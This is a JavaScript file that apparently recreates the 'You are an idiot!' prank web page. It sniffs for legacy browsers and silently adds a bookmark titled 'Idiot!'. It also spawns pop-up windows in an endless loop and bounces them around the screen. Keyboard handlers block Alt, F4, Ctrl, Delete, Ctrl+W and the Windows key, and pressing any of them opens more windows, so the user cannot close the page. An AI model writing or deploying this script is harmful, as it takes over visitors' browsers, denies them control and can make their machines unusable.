// --- VULNERABLE BROWSER DETECTION & REDIRECT ---
// This must run BEFORE any modern code tries to execute.
(function() {
  // Target: IE6, IE5, IE4, or specific ancient browsers
  var isLegacyIE = false;
  if (navigator.appName == "Microsoft Internet Explorer") {
    var version = parseInt(navigator.appVersion);
    if (version <= 6) { // IE6 and older
      isLegacyIE = true;
    }
  }
  // Fallback for Netscape 4 or ancient Mozilla builds
  else if (navigator.appName == "Netscape" && parseInt(navigator.appVersion) < 5) {
    isLegacyIE = true;
  }

  if (isLegacyIE) {
    window.location.href = "legacy.html";
    return; // Stop the rest of the script from loading in legacy browsers
  }
})();


// --- IE6 Bookmark Trap ---
function bookmark() {
  if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
    var url = "lol.html";
    var title = "Idiot!";
    window.external.AddFavorite(url, title);
  }
}

// --- Bounce Logic (Optimized for 50+ windows) ---
var flagRun = 1;
var xOff = 5, yOff = 5, xPos = 400, yPos = -100;

function playBall() {
  if (flagRun != 1) return;
  
  // Update position
  xPos += xOff; yPos += yOff;
  
  // Bounce off edges
  if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
  if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
  if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
  if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
  
  // Move the window
  window.moveTo(xPos, yPos);
  
  // Use requestAnimationFrame instead of setTimeout
  requestAnimationFrame(playBall);
}

// --- Pop-up Spawner ---
function openWindow(url) {
  window.open(url, '_blank', 'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes');
}

function procreate() {
  for (var i = 0; i < 5; i++) openWindow('lol.html');
}

// --- Master Switch ---
var prankActive = false;

// --- Keyboard Traps (Armed globally) ---
function armTraps() {
  if (window.addEventListener) {
    window.addEventListener("keydown", function(event) {
      if (!prankActive) return;

      if (event.key === "Alt" || event.keyCode === 18) {
        event.preventDefault();
        alert("You are an idiot!");
        procreate();
      }
      if (event.key === "F4") {
        event.preventDefault();
        alert("You are an idiot!");
        procreate();
      }
      if (event.key === "Control" || event.keyCode === 17) {
        event.preventDefault();
        alert("You are an idiot!");
        procreate();
      }
      if (event.key === "Delete" || event.keyCode === 46) {
        event.preventDefault();
        alert("You are an idiot!");
        procreate();
      }
      if ((event.ctrlKey && event.key === "w") || (event.ctrlKey && event.key === "W")) {
        event.preventDefault();
        alert("Not even Tux can save you now!");
        procreate();
      }
      if (event.key === "Meta" || event.keyCode === 91 || event.keyCode === 92) {
        event.preventDefault();
        alert("You are an idiot!");
        for (var i = 0; i < 30; i++) {
          openWindow('lol.html');
        }
      }
    });
  }
}

// --- Auto-arm traps on load ---
armTraps();

// --- Main Prank Trigger ---
function startPrank() {
  prankActive = true;
  document.getElementById('start-screen').style.display = 'none';
  document.getElementById('media-container').style.display = 'flex';
  document.getElementById('idiot-audio').play();
  document.title = "You are an idiot!";
  flagRun = 1;
  playBall();
  procreate();
  setInterval('procreate()', 2500);
}
